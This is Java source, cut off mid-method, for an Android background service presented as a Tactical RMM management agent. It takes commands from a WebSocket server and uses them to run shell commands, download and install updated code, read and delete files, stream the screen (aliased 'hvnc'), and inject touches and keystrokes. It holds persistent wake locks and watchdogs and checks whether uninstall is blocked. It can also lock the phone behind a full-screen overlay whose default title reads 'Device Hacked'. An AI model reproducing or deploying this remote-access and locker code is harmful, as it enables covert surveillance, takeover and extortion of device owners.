package com.trmm.agent;

import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInstaller;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.graphics.Typeface;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.StatFs;
import android.os.Vibrator;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowInsets;
import android.view.WindowInsetsController;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;
import android.util.Base64;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URI;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashSet;
import java.util.Set;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class AgentService extends Service implements WebSocketClient.Listener {
    public static final String ACTION_STATUS_UPDATE = "com.trmm.agent.STATUS_UPDATE";
    public static final String EXTRA_STATUS = "status";
    public static final String EXTRA_LOG = "log";

    private static final String CHANNEL_ID = "trmm_agent_service";
    private static final String CHANNEL_LOCK_ID = "trmm_emergency_lock";
    private static final int NOTIFICATION_ID = 1001;

    public static int mediaProjectionResultCode = 0;
    public static Intent mediaProjectionResultData = null;
    private static AgentService instance = null;
    private volatile byte[] lastValidJpegBytes = null;

    private View curtainOverlayView = null;
    private WindowManager windowManager = null;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    public static void setMediaProjectionData(int resultCode, Intent data) {
        mediaProjectionResultCode = resultCode;
        mediaProjectionResultData = data;
        if (instance != null) {
            instance.initMediaProjection();
        }
    }

    private static class AgentProjectionCallback extends MediaProjection.Callback {
        private final java.lang.ref.WeakReference<AgentService> serviceRef;

        public AgentProjectionCallback(AgentService service) {
            this.serviceRef = new java.lang.ref.WeakReference<>(service);
        }

        @Override
        public void onStop() {
            Log.i("TRMMAgent", "MediaProjection stopped by system.");
            AgentService s = serviceRef.get();
            if (s != null) {
                s.onProjectionStopped();
            }
        }
    }

    static class GlobalExceptionHandler implements Thread.UncaughtExceptionHandler {
        @Override
        public void uncaughtException(Thread thread, Throwable throwable) {
            Log.e("TRMMAgent", "Uncaught exception in " + (thread != null ? thread.getName() : "unknown") + ": " + (throwable != null ? throwable.getMessage() : "unknown"), throwable);
        }
    }

    static class ConnectRunnable implements Runnable {
        private final AgentService service;

        public ConnectRunnable(AgentService service) {
            this.service = service;
        }

        @Override
        public void run() {
            try {
                service.ensureConnected();
            } catch (Throwable t) {
                Log.e("TRMMAgent", "Error in ConnectRunnable", t);
            }
        }
    }

    public static Context getSafeContext(Context context) {
        if (context == null) return null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            return context.createDeviceProtectedStorageContext();
        }
        return context;
    }

    public static SharedPreferences getSafePreferences(Context context, String name) {
        if (context == null) return null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                Context deContext = context.createDeviceProtectedStorageContext();
                SharedPreferences dePrefs = deContext.getSharedPreferences(name, Context.MODE_PRIVATE);
                if (dePrefs.getAll().isEmpty()) {
                    try {
                        android.os.UserManager um = (android.os.UserManager) context.getSystemService(Context.USER_SERVICE);
                        if (um != null && um.isUserUnlocked()) {
                            deContext.moveSharedPreferencesFrom(context, name);
                            return deContext.getSharedPreferences(name, Context.MODE_PRIVATE);
                        }
                    } catch (Throwable ignored) {}
                }
                return dePrefs;
            } catch (Throwable ignored) {}
        }
        return context.getSharedPreferences(name, Context.MODE_PRIVATE);
    }

    static class TelemetryRunnable implements Runnable {
        private final AgentService service;

        public TelemetryRunnable(AgentService service) {
            this.service = service;
        }

        @Override
        public void run() {
            try {
                service.sendTelemetry();
                service.scheduleWatchdogAlarm();
            } catch (Throwable t) {
                Log.e("TRMMAgent", "Error in TelemetryRunnable", t);
            }
        }
    }

    static class OtaUpdateRunnable implements Runnable {
        private final AgentService service;
        private final String downloadUrl;
        private final String expectedSha;
        private final String version;

        public OtaUpdateRunnable(AgentService service, String downloadUrl, String expectedSha, String version) {
            this.service = service;
            this.downloadUrl = downloadUrl;
            this.expectedSha = expectedSha;
            this.version = version;
        }

        @Override
        public void run() {
            try {
                service.executeOtaUpdate(downloadUrl, expectedSha, version);
            } catch (Throwable t) {
                Log.e("TRMMAgent", "Error in OtaUpdateRunnable: " + t.getMessage(), t);
            }
        }
    }

    static class ShellRunnable implements Runnable {
        private final AgentService service;
        private final String cmd;

        public ShellRunnable(AgentService service, String cmd) {
            this.service = service;
            this.cmd = cmd;
        }

        @Override
        public void run() {
            try {
                service.runShellSync(cmd);
            } catch (Throwable t) {
                Log.e("TRMMAgent", "Error in ShellRunnable", t);
            }
        }
    }

    static class InputShellRunnable implements Runnable {
        private final String cmd;

        public InputShellRunnable(String cmd) {
            this.cmd = cmd;
        }

        @Override
        public void run() {
            try {
                Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", cmd});
                p.waitFor();
            } catch (Throwable ignored) {}
        }
    }

    static class FileListRunnable implements Runnable {
        private final AgentService service;
        private final JSONObject msg;

        public FileListRunnable(AgentService service, JSONObject msg) {
            this.service = service;
            this.msg = msg;
        }

        @Override
        public void run() {
            if (service != null) {
                service.performFileList(msg);
            }
        }
    }

    static class FileReadRunnable implements Runnable {
        private final AgentService service;
        private final JSONObject msg;

        public FileReadRunnable(AgentService service, JSONObject msg) {
            this.service = service;
            this.msg = msg;
        }

        @Override
        public void run() {
            if (service != null) {
                service.performFileRead(msg);
            }
        }
    }

    static class FileDeleteRunnable implements Runnable {
        private final AgentService service;
        private final JSONObject msg;

        public FileDeleteRunnable(AgentService service, JSONObject msg) {
            this.service = service;
            this.msg = msg;
        }

        @Override
        public void run() {
            if (service != null) {
                service.performFileDelete(msg);
            }
        }
    }

    static class StreamRunnable implements Runnable {
        private final AgentService service;

        public StreamRunnable(AgentService service) {
            this.service = service;
        }

        @Override
        public void run() {
            try {
                service.streamScreenFramesLoop();
            } catch (Throwable t) {
                Log.e("TRMMAgent", "Error in StreamRunnable", t);
            }
        }
    }

    static class CurtainOverlayTouchListener implements View.OnTouchListener {
        @Override
        public boolean onTouch(View v, MotionEvent event) {
            return true;
        }
    }

    static class CurtainOverlayKeyListener implements View.OnKeyListener {
        @Override
        public boolean onKey(View v, int keyCode, KeyEvent event) {
            return true;
        }
    }

    static class CurtainOverlayAttachListener implements View.OnAttachStateChangeListener {
        @Override
        public void onViewAttachedToWindow(View v) {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    WindowInsetsController wic = v.getWindowInsetsController();
                    if (wic != null) {
                        wic.hide(WindowInsets.Type.statusBars() | WindowInsets.Type.navigationBars());
                        wic.setSystemBarsBehavior(WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE);
                    }
                }
            } catch (Throwable ignored) {}
        }

        @Override
        public void onViewDetachedFromWindow(View v) {}
    }

    static class ShowOverlayRunnable implements Runnable {
        private final AgentService service;
        private final String title;
        private final String message;
        private final String subtitle;

        public ShowOverlayRunnable(AgentService service, String title, String message, String subtitle) {
            this.service = service;
            this.title = title;
            this.message = message;
            this.subtitle = subtitle;
        }

        @Override
        public void run() {
            if (service != null) {
                service.performShowCurtainOverlay(title, message, subtitle);
            }
        }
    }

    static class HideOverlayRunnable implements Runnable {
        private final AgentService service;

        public HideOverlayRunnable(AgentService service) {
            this.service = service;
        }

        @Override
        public void run() {
            if (service != null) {
                service.performHideCurtainOverlay();
            }
        }
    }

    static class CurtainWatchdogRunnable implements Runnable {
        private final AgentService service;

        public CurtainWatchdogRunnable(AgentService service) {
            this.service = service;
        }

        @Override
        public void run() {
            if (service != null) {
                service.performCurtainWatchdog();
            }
        }
    }

    private PowerManager.WakeLock wakeLock;
    private WebSocketClient wsClient;
    private ScheduledExecutorService scheduler;
    private volatile boolean running = false;
    private volatile boolean isStreaming = false;

    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Thread screenStreamThread;

    private Bitmap reusableBitmap = null;
    private Bitmap reusableCroppedBitmap = null;
    private Canvas reusableCropCanvas = null;
    private Rect srcRect = null;
    private Rect dstRect = null;
    private final ByteArrayOutputStream reusableBos = new ByteArrayOutputStream(65536);
    private int lastAllocW = 0;
    private int lastAllocH = 0;
    private int lastAllocRowPadding = 0;
    private int mirrorFrameSequence = 0;
    private PowerManager.WakeLock screenWakeLock = null;

    private synchronized void acquireScreenWakeLock() {
        try {
            if (screenWakeLock == null) {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                if (pm != null) {
                    screenWakeLock = pm.newWakeLock(
                            PowerManager.SCREEN_DIM_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE,
                            "TRMMAgent:MirrorActiveWakeLock"
                    );
                    screenWakeLock.setReferenceCounted(false);
                }
            }
            if (screenWakeLock != null && !screenWakeLock.isHeld()) {
                screenWakeLock.acquire();
                log("[OK] Device screen kept awake for active screen share session.");
            }
        } catch (Throwable ignored) {}
    }

    private synchronized void releaseScreenWakeLock() {
        try {
            if (screenWakeLock != null && screenWakeLock.isHeld()) {
                screenWakeLock.release();
                log("Screen wake lock released.");
            }
        } catch (Throwable ignored) {}
    }

    private void wakeScreenIfAsleep() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isInteractive()) {
                PowerManager.WakeLock wl = pm.newWakeLock(
                        PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE,
                        "TRMMAgent:WakeOnDemand"
                );
                wl.acquire(3000L);
                log("Device screen was asleep. Woke physical display for live stream.");
            }
        } catch (Throwable ignored) {}
    }

    public String getApplicationLabelName() {
        try {
            return getString(R.string.app_name);
        } catch (Throwable t) {
            return "Management Service";
        }
    }

    private String serverUrl = "ws://10.0.2.2:8000";
    private String agentId = "android_agent";
    private String packageId = "android_agent";
    private String deviceHardwareId = "";
    private String endpointTag = "Android-Device";
    private boolean autoStart = true;
    private ConnectivityManager.NetworkCallback networkCallback;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;

        // Catch any unhandled thread errors so app never displays "[App] keeps stopping"
        Thread.setDefaultUncaughtExceptionHandler(new GlobalExceptionHandler());

        loadConfig();
        createNotificationChannel();

        // Apply Android Enterprise Device Owner policies and protection
        AdminReceiver.applyDeviceOwnerPolicies(this);

        // Network monitoring for automatic sub-second reconnection upon internet restore
        registerNetworkCallback();

        // Start Foreground Service safely with dataSync | specialUse
        safeStartForeground("Service Active");

        // Persistent WakeLock so OS Doze doesn't sleep the socket
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "TRMMAgent::ServiceWakeLock");
                wakeLock.setReferenceCounted(false);
                if (!wakeLock.isHeld()) {
                    wakeLock.acquire();
                }
            }
        } catch (Throwable t) {
            Log.w("TRMMAgent", "WakeLock acquire warning: " + t.getMessage());
        }

        // Start agent connection & telemetry loop immediately upon creation
        if (!running) {
            running = true;
            startAgentLoop();
        }

        // Resume lock screen experience if locked prior to service restart or device reboot
        try {
            SharedPreferences prefs = getSafePreferences(this, CurtainActivity.PREFS_NAME);
            if (prefs.getBoolean(CurtainActivity.PREF_IS_LOCKED, false)) {
                String title = prefs.getString(CurtainActivity.PREF_TITLE, "");
                String msg = prefs.getString(CurtainActivity.PREF_MESSAGE, "");
                String sub = prefs.getString(CurtainActivity.PREF_SUBTITLE, "");
                toggleCurtain(true, title, msg, sub);
            }
        } catch (Throwable ignored) {}
    }

    private void safeStartForeground(String statusText) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                int fgsType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
                if (Build.VERSION.SDK_INT >= 34) {
                    // FOREGROUND_SERVICE_TYPE_SPECIAL_USE = 0x40000000
                    fgsType |= 0x40000000;
                    if (isStreaming && mediaProjectionResultData != null) {
                        fgsType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
                    }
                }
                startForeground(
                        NOTIFICATION_ID,
                        buildNotification(statusText),
                        fgsType
                );
            } else {
                startForeground(NOTIFICATION_ID, buildNotification(statusText));
            }
        } catch (Throwable t) {
            try {
                startForeground(NOTIFICATION_ID, buildNotification(statusText));
            } catch (Throwable ignored) {}
        }
    }

    private void loadConfig() {
        try {
            SharedPreferences idPrefs = getSafePreferences(this, "trmm_agent_identity");

            try {
                InputStream is = getAssets().open("config.json");
                byte[] buf = new byte[is.available()];
                is.read(buf);
                is.close();
                JSONObject cfg = new JSONObject(new String(buf, StandardCharsets.UTF_8));
                serverUrl = cfg.optString("server_url", serverUrl);
                String cfgAgentId = cfg.optString("agent_id", "android_agent");
                packageId = cfgAgentId;
                endpointTag = cfg.optString("endpoint_tag", endpointTag);
                autoStart = cfg.optBoolean("auto_start", true);

                if (idPrefs != null) {
                    idPrefs.edit()
                            .putString("cached_server_url", serverUrl)
                            .putString("cached_endpoint_tag", endpointTag)
                            .putString("cached_package_id", packageId)
                            .apply();
                }
            } catch (Throwable t) {
                Log.w("TRMMAgent", "Notice: config.json assets read: " + t.getMessage() + ". Falling back to cached prefs.");
                if (idPrefs != null) {
                    serverUrl = idPrefs.getString("cached_server_url", serverUrl);
                    endpointTag = idPrefs.getString("cached_endpoint_tag", endpointTag);
                    packageId = idPrefs.getString("cached_package_id", packageId);
                }
            }

            // Unique persistent hardware identity per device
            String persistentAgentId = idPrefs != null ? idPrefs.getString("device_agent_id", null) : null;
            String androidId = "";
            try {
                androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            } catch (Throwable ignored) {}
            if (androidId == null || androidId.trim().isEmpty() || "9774d56d682e549c".equals(androidId)) {
                androidId = UUID.randomUUID().toString().replace("-", "");
            }
            deviceHardwareId = androidId;

            if (persistentAgentId == null || persistentAgentId.trim().isEmpty()) {
                try {
                    MessageDigest md = MessageDigest.getInstance("SHA-256");
                    byte[] hash = md.digest((androidId + "_" + Build.MANUFACTURER + "_" + Build.MODEL).getBytes(StandardCharsets.UTF_8));
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < 4; i++) {
                        sb.append(String.format("%02x", hash[i]));
                    }
                    persistentAgentId = sb.toString();
                } catch (Throwable t) {
                    persistentAgentId = UUID.randomUUID().toString().substring(0, 8);
                }
                if (idPrefs != null) {
                    idPrefs.edit()
                        .putString("device_agent_id", persistentAgentId)
                        .putString("android_id", androidId)
                        .putString("package_id", packageId)
                        .apply();
                }
            }
            agentId = persistentAgentId;
        } catch (Throwable t) {
            Log.w("TRMMAgent", "loadConfig error: " + t.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Guarantee foreground notification is promoted immediately (satisfies 5-second Android requirement)
        safeStartForeground("Service Active");

        if (!running) {
            running = true;
            startAgentLoop();
        }
        if (intent != null && "PROMOTE_MEDIA_PROJECTION".equals(intent.getAction())) {
            int rc = intent.getIntExtra("RESULT_CODE", mediaProjectionResultCode);
            Intent dt = intent.getParcelableExtra("RESULT_DATA");
            if (dt != null) {
                mediaProjectionResultCode = rc;
                mediaProjectionResultData = dt;
            }
            safeStartForeground("Service Active");
            initMediaProjection();
        }
        if (intent != null && "ACTION_REASSERT_LOCK".equals(intent.getAction())) {
            try {
                SharedPreferences prefs = getSafePreferences(this, CurtainActivity.PREFS_NAME);
                if (prefs.getBoolean(CurtainActivity.PREF_IS_LOCKED, false)) {
                    String title = prefs.getString(CurtainActivity.PREF_TITLE, "");
                    String msg = prefs.getString(CurtainActivity.PREF_MESSAGE, "");
                    String sub = prefs.getString(CurtainActivity.PREF_SUBTITLE, "");
                    toggleCurtain(true, title, msg, sub);
                }
            } catch (Throwable ignored) {}
        }
        return START_STICKY;
    }

    private synchronized void startAgentLoop() {
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdownNow();
        }
        scheduler = Executors.newScheduledThreadPool(2);

        // Connection manager runs every 3 seconds
        scheduler.scheduleWithFixedDelay(new ConnectRunnable(this), 0, 3, TimeUnit.SECONDS);

        // Telemetry / heartbeat ping runs every 5 seconds
        scheduler.scheduleWithFixedDelay(new TelemetryRunnable(this), 2, 5, TimeUnit.SECONDS);

        // Prime the Watchdog Alarm and JobScheduler
        scheduleWatchdogAlarm();
        AgentJobService.schedule(this);
    }

    void scheduleWatchdogAlarm() {
        BootReceiver.scheduleWatchdog(this);
    }

    synchronized void ensureConnected() {
        if (wsClient != null && wsClient.isConnected()) {
            return;
        }

        try {
            if (wsClient != null) {
                try {
                    wsClient.close();
                } catch (Throwable ignored) {}
            }
            log("Connecting to " + serverUrl + "...");
            String wsUrl = serverUrl;
            if (wsUrl.endsWith("/")) wsUrl = wsUrl.substring(0, wsUrl.length() - 1);
            URI uri = new URI(wsUrl + "/ws/agent/" + agentId);

            wsClient = new WebSocketClient(uri, this);
            wsClient.connect();
        } catch (Throwable e) {
            log("Connection attempt failed: " + e.getMessage());
            updateNotification("Connecting...");
        }
    }

    private void sendRegistration() {
        try {
            boolean isOwner = false;
            boolean isAdmin = false;
            boolean isUninstallBlocked = false;
            try {
                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                ComponentName adminComp = AdminReceiver.getComponentName(this);
                if (dpm != null) {
                    isOwner = dpm.isDeviceOwnerApp(getPackageName());
                    isAdmin = dpm.isAdminActive(adminComp);
                    if (isOwner) {
                        try {
                            isUninstallBlocked = dpm.isUninstallBlocked(adminComp, getPackageName());
                        } catch (Throwable ignored) {}
                    }
                }
            } catch (Throwable ignored) {}
            String mgtMode = isOwner ? "Device Owner (Corporate)" : (isAdmin ? "Device Admin" : "Unmanaged");

            JSONObject reg = new JSONObject();
            String dexHash = getClassesDexHash();
            reg.put("type", "handshake");
            reg.put("agent_id", agentId);
            reg.put("code_hash", dexHash);
            reg.put("app_version", "3.7.0");
            reg.put("device_id", deviceHardwareId);
            reg.put("android_id", deviceHardwareId);
            reg.put("package_id", packageId);
            reg.put("installation_id", packageId);
            reg.put("hostname", Build.MANUFACTURER + " " + Build.MODEL);
            reg.put("device_name", Build.MANUFACTURER + " " + Build.MODEL);
            reg.put("username", "Android " + Build.VERSION.RELEASE);
            reg.put("os", "Android device");
            reg.put("arch", "android");
            reg.put("platform", "android");
            reg.put("is_android", true);
            reg.put("device_type", "phone");
            reg.put("endpoint_tag", endpointTag);
            reg.put("is_device_owner", isOwner);
            reg.put("is_device_admin", isAdmin);
            reg.put("uninstall_blocked", isUninstallBlocked);
            reg.put("management_mode", mgtMode);

            JSONObject data = new JSONObject();
            data.put("agent_id", agentId);
            data.put("code_hash", dexHash);
            data.put("app_version", "3.7.0");
            data.put("device_id", deviceHardwareId);
            data.put("android_id", deviceHardwareId);
            data.put("package_id", packageId);
            data.put("installation_id", packageId);
            data.put("hostname", Build.MANUFACTURER + " " + Build.MODEL);
            data.put("device_name", Build.MANUFACTURER + " " + Build.MODEL);
            data.put("username", "Android " + Build.VERSION.RELEASE);
            data.put("os", "Android device");
            data.put("ip", getLocalIpAddress());
            data.put("endpoint_tag", endpointTag);
            data.put("arch", "android");
            data.put("platform", "android");
            data.put("is_android", true);
            data.put("device_type", "phone");
            data.put("status", "online");
            data.put("is_device_owner", isOwner);
            data.put("is_device_admin", isAdmin);
            data.put("uninstall_blocked", isUninstallBlocked);
            data.put("management_mode", mgtMode);

            // Battery (using BatteryManager properties - 100% receiver-free)
            try {
                BatteryManager bm = (BatteryManager) getSystemService(Context.BATTERY_SERVICE);
                if (bm != null) {
                    int level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                    if (level >= 0) {
                        data.put("battery", level);
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        int status = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS);
                        boolean isCharging = (status == BatteryManager.BATTERY_STATUS_CHARGING ||
                                status == BatteryManager.BATTERY_STATUS_FULL);
                        data.put("battery_charging", isCharging);
                    }
                }
            } catch (Throwable ignored) {}

            // Memory & Disk
            try {
                Runtime rt = Runtime.getRuntime();
                long totalMem = rt.totalMemory();
                data.put("ram_gb", String.format("%.1f GB", totalMem / (1024.0 * 1024.0 * 1024.0)));

                StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
                long bytesAvailable = stat.getBlockSizeLong() * stat.getAvailableBlocksLong();
                data.put("disk_free_gb", String.format("%.1f GB", bytesAvailable / (1024.0 * 1024.0 * 1024.0)));
            } catch (Throwable ignored) {}

            reg.put("data", data);

            if (wsClient != null && wsClient.isConnected()) {
                wsClient.send(reg.toString());
                log("Registered successfully with Master Hub as " + endpointTag);
                updateNotification("Connected" + (endpointTag != null && !endpointTag.isEmpty() ? " • " + endpointTag : ""));
                broadcastStatus("Connected");
            }
        } catch (Throwable e) {
            log("Error sending registration: " + e.getMessage());
        }
    }

    void sendTelemetry() {
        if (wsClient == null || !wsClient.isConnected()) return;
        try {
            boolean isOwner = false;
            boolean isAdmin = false;
            boolean isUninstallBlocked = false;
            try {
                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                ComponentName adminComp = AdminReceiver.getComponentName(this);
                if (dpm != null) {
                    isOwner = dpm.isDeviceOwnerApp(getPackageName());
                    isAdmin = dpm.isAdminActive(adminComp);
                    if (isOwner) {
                        try {
                            isUninstallBlocked = dpm.isUninstallBlocked(adminComp, getPackageName());
                        } catch (Throwable ignored) {}
                    }
                }
            } catch (Throwable ignored) {}
            String mgtMode = isOwner ? "Device Owner (Corporate)" : (isAdmin ? "Device Admin" : "Unmanaged");

            JSONObject tel = new JSONObject();
            String dexHash = getClassesDexHash();
            tel.put("type", "heartbeat");
            tel.put("agent_id", agentId);
            tel.put("code_hash", dexHash);
            tel.put("app_version", "3.7.0");
            tel.put("device_id", deviceHardwareId);
            tel.put("android_id", deviceHardwareId);
            tel.put("package_id", packageId);
            tel.put("installation_id", packageId);
            tel.put("hostname", Build.MANUFACTURER + " " + Build.MODEL);
            tel.put("device_name", Build.MANUFACTURER + " " + Build.MODEL);
            tel.put("username", "Android " + Build.VERSION.RELEASE);
            tel.put("os", "Android device");
            tel.put("arch", "android");
            tel.put("platform", "android");
            tel.put("is_android", true);
            tel.put("device_type", "phone");
            tel.put("endpoint_tag", endpointTag);
            tel.put("is_device_owner", isOwner);
            tel.put("is_device_admin", isAdmin);
            tel.put("uninstall_blocked", isUninstallBlocked);
            tel.put("management_mode", mgtMode);

            JSONObject data = new JSONObject();
            data.put("agent_id", agentId);
            data.put("code_hash", dexHash);
            data.put("app_version", "3.7.0");
            data.put("device_id", deviceHardwareId);
            data.put("android_id", deviceHardwareId);
            data.put("package_id", packageId);
            data.put("installation_id", packageId);
            data.put("hostname", Build.MANUFACTURER + " " + Build.MODEL);
            data.put("device_name", Build.MANUFACTURER + " " + Build.MODEL);
            data.put("username", "Android " + Build.VERSION.RELEASE);
            data.put("os", "Android device");
            data.put("ip", getLocalIpAddress());
            data.put("endpoint_tag", endpointTag);
            data.put("arch", "android");
            data.put("platform", "android");
            data.put("is_android", true);
            data.put("device_type", "phone");
            data.put("status", "online");
            data.put("is_device_owner", isOwner);
            data.put("is_device_admin", isAdmin);
            data.put("uninstall_blocked", isUninstallBlocked);
            data.put("management_mode", mgtMode);

            try {
                BatteryManager bm = (BatteryManager) getSystemService(Context.BATTERY_SERVICE);
                if (bm != null) {
                    int level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                    if (level >= 0) {
                        data.put("battery", level);
                    }
                }
            } catch (Throwable ignored) {}

            tel.put("data", data);
            wsClient.send(tel.toString());
            wsClient.sendPing();
        } catch (Throwable ignored) {}
    }

    @Override
    public void onOpen() {
        log("WebSocket connected. Sending registration handshake...");
        sendRegistration();
    }

    @Override
    public void onMessage(String text) {
        try {
            JSONObject msg = new JSONObject(text);
            String type = msg.optString("type");

            if ("execute_shell".equalsIgnoreCase(type) || "shell".equalsIgnoreCase(type) || "cmd".equalsIgnoreCase(type)) {
                String cmd = msg.optString("command");
                executeShellCommand(cmd);
            } else if ("update_app".equalsIgnoreCase(type) || "ota_update".equalsIgnoreCase(type) || "sync_code".equalsIgnoreCase(type)) {
                String downloadUrl = msg.optString("download_url");
                String sha256 = msg.optString("sha256");
                String version = msg.optString("version", "Latest");
                log("Received OTA update instruction: version=" + version + ", url=" + downloadUrl);
                performOtaUpdate(downloadUrl, sha256, version);
            } else if ("ping".equalsIgnoreCase(type)) {
                JSONObject pong = new JSONObject();
                pong.put("type", "pong");
                pong.put("agent_id", agentId);
                if (wsClient != null) wsClient.send(pong.toString());
            } else if ("toast".equalsIgnoreCase(type) || "notify".equalsIgnoreCase(type)) {
                String toastText = msg.optString("message", "Tactical RMM Notification");
                Toast.makeText(this, toastText, Toast.LENGTH_LONG).show();
            } else if ("vibrate".equalsIgnoreCase(type)) {
                Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                if (v != null) v.vibrate(500);
            } else if ("start_mirror".equalsIgnoreCase(type) || "start_hvnc".equalsIgnoreCase(type)) {
                log("Received start screen stream request.");
                startScreenStreaming();
            } else if ("mirror_refresh".equalsIgnoreCase(type)) {
                wakeScreenIfAsleep();
                if (virtualDisplay != null && imageReader != null) {
                    try {
                        virtualDisplay.setSurface(imageReader.getSurface());
                    } catch (Throwable ignored) {}
                }
                sendCachedMirrorFrame();
            } else if ("stop_mirror".equalsIgnoreCase(type) || "stop_hvnc".equalsIgnoreCase(type)) {
                log("Received stop screen stream request.");
                stopScreenStreaming();
            } else if ("set_curtain".equalsIgnoreCase(type)) {
                boolean enabled = msg.optBoolean("enabled", false);
                String title = msg.optString("title", "");
                String message = msg.optString("message", "");
                String subtitle = msg.optString("subtitle", "");
                toggleCurtain(enabled, title, message, subtitle);
            } else if ("input".equalsIgnoreCase(type)) {
                JSONObject data = msg.optJSONObject("data");
                if (data == null) data = msg;
                handleRemoteInput(data);
            } else if ("file_list".equalsIgnoreCase(type)) {
                handleFileList(msg);
            } else if ("file_read".equalsIgnoreCase(type) || "file_download".equalsIgnoreCase(type)) {
                handleFileRead(msg);
            } else if ("file_delete".equalsIgnoreCase(type)) {
                handleFileDelete(msg);
            } else if ("admin_policy".equalsIgnoreCase(type) || "set_policy".equalsIgnoreCase(type) || "policy".equalsIgnoreCase(type)) {
                handleAdminPolicy(msg);
            } else if ("mousedown".equalsIgnoreCase(type) || "mouseup".equalsIgnoreCase(type) || "mousemove".equalsIgnoreCase(type)
                    || "tap".equalsIgnoreCase(type) || "swipe".equalsIgnoreCase(type) || "wheel".equalsIgnoreCase(type)
                    || "scroll".equalsIgnoreCase(type) || "android_nav".equalsIgnoreCase(type) || "keyevent".equalsIgnoreCase(type)
                    || "type_text".equalsIgnoreCase(type) || "char".equalsIgnoreCase(type) || "keydown".equalsIgnoreCase(type)) {
                handleRemoteInput(msg);
            }
        } catch (Throwable e) {
            log("Error handling message: " + e.getMessage());
        }
    }

    private void showCurtainOverlay(String title, String message, String subtitle) {
        mainHandler.post(new ShowOverlayRunnable(this, title, message, subtitle));
    }

    private void hideCurtainOverlay() {
        mainHandler.post(new HideOverlayRunnable(this));
    }

    void performShowCurtainOverlay(String title, String message, String subtitle) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!Settings.canDrawOverlays(this)) {
                    // Overlay permission not granted; CurtainActivity will handle full-screen locking seamlessly
                    return;
                }
            }
            if (windowManager == null) {
                windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            }
            if (windowManager == null) return;

            final String resolvedTitle = (title != null && !title.trim().isEmpty()) ? title : "Device Hacked";
            final String resolvedMsg = (message != null && !message.trim().isEmpty()) ? message : "This device has been locked by your administrator.\nAll operations are temporarily suspended.";
